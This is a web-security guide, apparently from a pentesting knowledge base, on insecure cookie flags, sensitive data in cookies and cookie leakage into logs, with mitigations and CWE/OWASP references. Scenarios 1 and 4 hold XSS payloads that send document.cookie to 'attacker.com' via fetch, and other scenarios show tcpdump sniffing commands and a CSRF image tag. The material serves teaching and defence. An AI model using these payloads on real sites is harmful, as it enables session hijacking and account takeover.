# Cookie Security

Cookies are small pieces of data stored on the client-side and sent with every request. Three critical vulnerabilities emerge when cookies aren't properly secured:

***

### Real-World Attack Scenarios

#### Scenario 1: Missing HttpOnly Flag — XSS to Session Hijacking

An application sets a session cookie without the HttpOnly flag:

```http
HTTP/1.1 200 OK
Set-Cookie: sessionid=abc123def456; Path=/; Secure
```

The cookie is missing `HttpOnly`, meaning JavaScript can access it.

**The vulnerability:** An attacker finds an XSS vulnerability in a comment field:

```html
<div class="comment">
  <p>Check out this awesome tool!</p>
  <img src="x" onerror="fetch('http://attacker.com/steal?cookie=' + document.cookie)">
</div>
```

When users view the comment, the XSS payload executes and sends their session cookie to the attacker:

```http
GET /steal?cookie=sessionid=abc123def456 HTTP/1.1
Host: attacker.com
```

The attacker now has the victim's session cookie and can:

* Log in as the victim
* Access their account
* Modify their profile
* Perform actions on their behalf
* Access sensitive data

**Finding it:** Check browser cookies in DevTools. Look for session cookies without HttpOnly flag. Test for XSS vulnerabilities and verify if cookies are accessible to JavaScript.

**Exploit:**

```bash
# In browser console (if XSS vulnerability exists):
document.cookie
# Output: sessionid=abc123def456; other_cookie=value

# Or via XSS payload:
<img src=x onerror="fetch('http://attacker.com/steal?c=' + document.cookie)">

# Or JavaScript fetch:
fetch('http://attacker.com/log?cookie=' + document.cookie)
```

***

#### Scenario 2: Missing Secure Flag — HTTP Cookie Interception

An application sets a session cookie over HTTPS but without the Secure flag:

```http
HTTPS Response:
Set-Cookie: sessionid=abc123def456; Path=/; HttpOnly
```

The cookie is missing `Secure`, meaning it can be transmitted over HTTP.

**The vulnerability:**

An attacker performs SSL stripping or user visits HTTP version of the site:

```http
User visits: http://example.com/login
HTTP Request includes:
Cookie: sessionid=abc123def456
```

Even though HTTPS is configured, if the user visits HTTP, the browser sends the cookie unencrypted.

An attacker on the network (coffee shop WiFi, ISP, corporate network) captures the traffic:

```bash
tcpdump -i eth0 'tcp port 80' -A | grep -i cookie
# Captures: Cookie: sessionid=abc123def456
```

The attacker uses the stolen cookie to hijack the session.

**Attack scenarios:**

1. User accidentally visits http\:// instead of https\://
2. Attacker performs SSL stripping (downgrades HTTPS to HTTP)
3. User clicks a link on a page that redirects to HTTP
4. Mixed-content requests trigger HTTP fallback

**Finding it:** Check cookies in browser DevTools. Look for Secure flag. Test if cookies are sent over HTTP. Try accessing HTTP version of HTTPS-only site.

**Exploit:**

```bash
# Test if HTTP accepts the cookie
curl -i http://example.com -H "Cookie: sessionid=abc123def456"

# If the request succeeds, the cookie works over HTTP (vulnerable)

# Or monitor network traffic:
tcpdump -i eth0 'tcp port 80' -A | grep -i cookie
```

***

#### Scenario 3: Plaintext Sensitive Data in Cookies

An application stores sensitive information directly in a cookie:

```javascript
// Vulnerable code
app.post('/login', (req, res) => {
    const user = authenticateUser(req.body.email, req.body.password);
    
    if (user) {
        // Storing sensitive data in plain text
        res.setHeader('Set-Cookie', `user_data=${JSON.stringify({
            email: user.email,
            password_hash: user.password_hash,
            api_key: user.api_key,
            credit_card_last4: user.cc_last4,
            ssn: user.ssn
        })}; Path=/`);
        
        res.send('Login successful');
    }
});
```

The cookie contains:

```javascript
user_data={"email":"user@company.com","password_hash":"$2b$10$...","api_key":"sk_REDACTED_live_4eC39HqLyjWDarht","credit_card_last4":"4242","ssn":"123-45-6789"}
```

**The attack vectors:**

1. **Browser storage:** Visible in browser DevTools, developer inspecting their own cookies can see all stored data
2. **JavaScript access:** If HttpOnly is not set, any JavaScript can read the cookie
3. **Network inspection:** If Secure flag is not set, cookie travels unencrypted
4. **Local machine access:** Anyone with access to the machine can read cookies from disk
5. **Memory dumps:** Crash dumps or memory analysis can extract cookies

An attacker who obtains this cookie has:

* Email address
* Password hash (may be crackable)
* API key (full API access)
* Credit card information
* Social security number

**Finding it:** Inspect cookies in DevTools. Base64 decode or JSON parse them. Check if they contain passwords, tokens, PII, or financial data. Test cookie contents after decoding.

**Exploit:**

```bash
# View cookie contents in browser console
document.cookie

# If cookie contains JSON:
JSON.parse("eyJlbWFpbCI6InVzZXJAY29tcGFueS5jb20iLCJhcGlfa2V5Ijoic2tfbGl2ZV8...".split('=')[1])

# Or decode base64:
echo "base64_cookie_value" | base64 -d

# Check captured network traffic for cookie contents
tcpdump -i eth0 'tcp port 443' -A | grep -i "set-cookie\|cookie:"
```

***

#### Scenario 4: Sensitive Cookie Without Any Protection Flags

An application sets a password reset token in a cookie with no security flags:

```javascript
// Vulnerable
app.post('/reset-password-request', (req, res) => {
    const resetToken = generateSecureToken();
    
    res.setHeader('Set-Cookie', `reset_token=${resetToken}`);
    // Missing: Secure, HttpOnly, SameSite
    
    sendResetEmail(req.body.email, resetToken);
    res.send('Reset link sent');
});
```

**The cookie is vulnerable to:**

1. **JavaScript theft (XSS):**

```javascript
// Malicious script on page
document.cookie  // Can read reset_token
fetch('http://attacker.com/steal?token=' + document.cookie)
```

2. **Network interception (MITM):**

```bash
# Any HTTP traffic sends the cookie
tcpdump -i eth0 'tcp port 80' -A | grep reset_token
```

3. **CSRF attacks:**

```html
<!-- Attacker's site -->
<img src="http://example.com/change-password?new_password=hacked&reset_token=...">
<!-- Uses victim's cookie automatically -->
```

4. **Physical access:** User leaves machine unlocked, attacker accesses browser cookies directly.

**The result:**

* Attacker can reset any user's password
* Full account takeover
* No audit trail of who performed the reset

**Finding it:** Inspect all cookies. Check for absence of security flags. Test if sensitive tokens are accessible to JavaScript. Try CSRF attacks using the token.

***

#### Scenario 5: Cookie Leakage in Logs and Monitoring

An application logs HTTP requests including cookies:

```python
# Vulnerable logging
import logging

@app.before_request
def log_request():
    logging.info(f"Request: {request.method} {request.path}")
    logging.info(f"Headers: {dict(request.headers)}")  # Includes cookies
    logging.info(f"Cookies: {request.cookies}")

@app.route('/api/user')
def get_user():
    # ... code ...
    return user_data
```

**Logs now contain:**

```
2024-01-15 10:23:45 - INFO - Request: GET /api/user
2024-01-15 10:23:45 - INFO - Headers: {'Cookie': 'sessionid=abc123def456; csrf_token=xyz789; user_id=42'}
2024-01-15 10:23:45 - INFO - Cookies: {'sessionid': 'abc123def456', 'csrf_token': 'xyz789', 'user_id': '42'}
```

**The attack:**

* Log aggregation systems (ELK, Splunk, CloudWatch) store all logs
* If log system is compromised or accessible, all session cookies are exposed
* Logs might be stored for years, multiplying the exposure window
* Multiple users' cookies accumulate in logs
* Attackers can harvest thousands of valid session tokens

**Finding it:** Check application logs for cookie data. Review what gets logged by default. Access log storage systems. Search logs for sensitive values.

***

### Mitigation Strategies

**Set all three critical flags on session cookies**

```
Set-Cookie: sessionid=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=3600
```

**Secure Flag:** Ensures cookie only sent over HTTPS, preventing interception over HTTP.

**HttpOnly Flag:** Prevents JavaScript from accessing the cookie, mitigating XSS attacks.

**SameSite Attribute:** Controls when cookies are sent with cross-site requests, preventing CSRF:

* `Strict`: Never send with cross-site requests
* `Lax`: Send with top-level navigations only
* `None`: Send with all requests (requires Secure flag)

**Never store sensitive data in cookies**

* Don't put passwords in cookies
* Don't put API keys in cookies
* Don't put PII in cookies
* Don't put payment information in cookies
* Store only session identifiers, not data

**Encrypt sensitive cookie values** If cookies must contain data, encrypt them:

```javascript
const encrypted = cipher.encrypt(sensitiveData);
res.setHeader('Set-Cookie', `data=${encrypted}; Secure; HttpOnly`);
```

**Use secure defaults in framework**

```python
# Flask example
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
```

**Validate cookie values server-side** Don't trust client-supplied cookie data:

```javascript
app.get('/dashboard', (req, res) => {
    const sessionId = req.cookies.sessionid;
    
    // Validate against server-side session store
    const session = sessionStore.get(sessionId);
    if (!session || session.expired) {
        return res.redirect('/login');
    }
    
    res.send(dashboard);
});
```

**Implement cookie rotation**

* Generate new session cookies after login
* Rotate cookies periodically
* Invalidate old cookies on logout

**Monitor and log cookie usage**

* Alert on suspicious cookie access
* Don't log cookie values
* Track cookie theft/abuse patterns

**Use security headers**

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'
```

***

{% embed url="<https://cwe.mitre.org/data/definitions/315.html>" %}

{% embed url="<https://cwe.mitre.org/data/definitions/614.html>" %}

{% embed url="<https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/README>" %}

{% embed url="<https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html>" %}

{% embed url="<https://cwe.mitre.org/data/definitions/1004.html>" %}
